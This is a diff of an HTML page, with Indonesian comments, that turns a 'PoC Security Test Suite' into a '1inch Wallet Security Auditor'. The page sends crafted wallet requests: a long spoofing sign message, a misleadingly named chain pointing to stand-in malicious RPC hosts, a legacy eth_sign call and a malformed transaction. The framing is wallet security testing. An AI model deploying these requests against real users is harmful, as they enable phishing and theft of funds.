@@ -2,52 +2,70 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>PoC Security Test Suite</title>
+    <title>1inch Wallet Security Auditor</title>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: #eee; padding: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; max-width: 500px; margin: auto; }
-        button { padding: 15px; border-radius: 8px; border: 1px solid #f00; background: #330000; color: #ff5555; cursor: pointer; font-weight: bold; }
-        #log { margin-top: 20px; background: #000; color: #0f0; padding: 10px; font-size: 11px; }
+        body { font-family: sans-serif; background: #0f172a; color: #f8fafc; padding: 20px; }
+        .container { max-width: 500px; margin: auto; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        button { padding: 12px; background: #334155; color: #38bdf8; border: 1px solid #38bdf8; border-radius: 6px; cursor: pointer; font-size: 12px; }
+        button:hover { background: #1e293b; }
+        #log { margin-top: 20px; background: #000; padding: 15px; border: 1px solid #334155; font-family: monospace; font-size: 11px; white-space: pre-wrap; overflow-x: auto; color: #a3e635; }
     </style>
 </head>
 <body>
-    <div class="grid">
-        <button onclick="spoof()">[1] UI Spoofing (Long String)</button>
-        
-        <button onclick="injectChain()">[2] Arbitrary Chain Injection</button>
-        
-        <button onclick="legacySign()">[3] Insecure eth_sign</button>
+    <div class="container">
+        <h2>Security Auditor Panel</h2>
+        <div class="grid">
+            <button onclick="audit('spoofing')">Test UI Spoofing</button>
+            <button onclick="audit('chain_inject')">Test Chain Injection</button>
+            <button onclick="audit('insecure_sign')">Test Insecure Sign</button>
+            <button onclick="audit('malformed_tx')">Test Malformed TX</button>
+        </div>
+        <pre id="log">Status: Menunggu aksi...</pre>
     </div>
-    <pre id="log">Status: Menunggu eksekusi...</pre>
 
     <script>
-        const log = (m) => document.getElementById('log').innerText = m;
+        const logEl = document.getElementById('log');
+        const log = (msg) => { console.log(msg); logEl.innerText = msg; };
 
-        async function spoof() {
-            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            // Mengirim pesan sangat panjang untuk menguji truncation/spoofing
-            const longMsg = "0x" + "PERMIT_ACCESS_TO_ALL_FUNDS_".repeat(20);
-            log("Spoofing: Mengirim pesan panjang untuk uji UI Truncation...");
-            await window.ethereum.request({ method: 'personal_sign', params: [longMsg, accs[0]] });
-        }
+        async function audit(type) {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const from = accounts[0];
+                let response;
 
-        async function injectChain() {
-            log("Injection: Meminta penambahan chain menyesatkan...");
-            await window.ethereum.request({
-                method: 'wallet_addEthereumChain',
-                params: [{
-                    chainId: '0x1337',
-                    chainName: 'MAINNET_OFFICIAL_CLONE', // Nama menyesatkan
-                    rpcUrls: ['https://malicious-rpc.example.com'],
-                }]
-            });
-        }
-
-        async function legacySign() {
-            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            log("Insecure: Menggunakan eth_sign (metode lama)...");
-            // Mengirim data raw agar dompet kesulitan memberi konteks
-            await window.ethereum.request({ method: 'eth_sign', params: [accs[0], "0xdeadbeef"] });
+                switch(type) {
+                    case 'spoofing':
+                        log("Menguji UI Spoofing: Mengirim pesan panjang...");
+                        response = await window.ethereum.request({ 
+                            method: 'personal_sign', 
+                            params: ["0x" + "ATTACK_".repeat(50), from] 
+                        });
+                        break;
+                    case 'chain_inject':
+                        log("Menguji Chain Injection...");
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{ chainId: '0xBAD', chainName: 'Malicious Chain', rpcUrls: ['https://evil.rpc'] }]
+                        });
+                        response = "Chain added (Check wallet response)";
+                        break;
+                    case 'insecure_sign':
+                        log("Menguji Legacy Sign...");
+                        response = await window.ethereum.request({ method: 'eth_sign', params: [from, "0xdeadbeef"] });
+                        break;
+                    case 'malformed_tx':
+                        log("Menguji Malformed TX...");
+                        response = await window.ethereum.request({ 
+                            method: 'eth_sendTransaction', 
+                            params: [{ from, to: from, data: '0xINVALID' }] 
+                        });
+                        break;
+                }
+                log("Response: " + JSON.stringify(response, null, 2));
+            } catch (err) {
+                log("Error Detected (Code: " + err.code + ")\n" + err.message);
+            }
         }
     </script>
 </body>
